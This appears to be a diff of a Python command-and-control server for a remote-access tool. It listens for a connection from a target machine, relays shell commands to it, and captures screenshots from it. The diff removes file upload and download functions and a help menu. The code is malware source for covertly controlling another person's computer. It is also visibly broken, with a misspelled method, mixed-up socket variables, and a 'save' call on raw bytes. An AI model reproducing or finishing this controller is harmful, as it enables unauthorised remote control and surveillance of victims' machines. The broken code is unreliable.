@@ -7,35 +7,6 @@ host = '127.0.0.1'
 port = 8080
 
 
-# send data to the client
-def data_send(data):
-    jsondata = json.dumps(data)
-    target.send(jsondata.encode())
-
-
-# upload files to the client machine
-def upload_file(file):
-    f = open(file, 'rb')
-    client.sen(f.read())
-
-
-# download files from the client machine
-def dowload_file(file):
-    f = open(file, 'wb')
-    client.settimeout(5)
-    chunk = target.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = client.recv(1024)
-
-        except socket.timeout as e:
-            break
-    client.settimeout(None)
-    f.close()
-
-
-
 # start socket object
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -50,50 +21,27 @@ print('[-] Waiting for connections...')
 client, addr = server.accept()
 print(f'\n\033[32m[+]\033[m Connected to {addr[0]} on port {addr[1]}')
 
-# counter for screenshot enumeration files
-count = 0
 
 # shell session
 while True:
-    comm = input(f'\n\033[1m*shell*\033[m ~ {addr[0]}:{addr[1]} >> ')
+    comm = input(f'\n\033[1m*shell*\033[m ~ {addr[0]}:{addr[1]} >> ').lower().strip()
     if comm == 'close':
         break
     elif comm == '':
         pass
     elif comm == 'clear':
         os.system('clear')
-    elif comm [:3] == 'cd ':
-        pass
-    elif comm [:6] == 'upload':
-        upload_file(comm[:7])
-    elif comm [:8] == 'download':
-        download_file(comm[:9])
-    elif comm == 'help':
-        print('''\n
-        close: close the connection with the client.
-        upload <file>: upload a file to the client machine.
-        download <file>: get a file from the client machine.
-        screenshot: takes a screenshot from the target machine.
-        clear: clear terminal.
-        \n
-        ''')
-    elif comm [:10] == 'screenshot':
-        #f = open('screenshot' % (count), 'wb')
-        f = open(f'screenshot{count}', 'wb')
-        client.settimeout(5)
-        chunk = client.recv(1024)
-        while chunk:
-            f.write(chunk)
-            try:
-                chunk = target.recv(1024)
-            except socket.timeout as e:
+    elif comm == 'screenshot':
+        count = 0
+        while True:
+            shot = client.recv(4096)
+            if not shot:
                 break
-        client.settimeout(None)
-        f.close()
-        count += 1
+            shot.save('screenshot{count}.png')
+            count += 1
     else:
         client.send(comm.encode())
         output = client.recv(1024).decode()
-        print(output)
+        print(f'\n{output}')
 
 server.close()
